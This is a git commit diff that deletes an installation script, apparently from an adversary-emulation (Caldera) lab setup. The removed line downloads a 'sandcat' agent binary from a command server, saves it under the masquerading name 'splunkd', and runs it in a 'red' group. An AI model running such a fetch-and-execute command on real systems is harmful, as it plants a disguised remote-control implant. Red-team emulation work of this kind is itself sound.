772eaef6757b384e7cf6259fd281f3ff837952e5
navinthomas94 <navinthomas94@gmail.com>
2022-10-11 10:53:05 -0700

    Updates to installation script

--- caldera_installation/install.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-server='http://10.20.20.1:8888';curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v
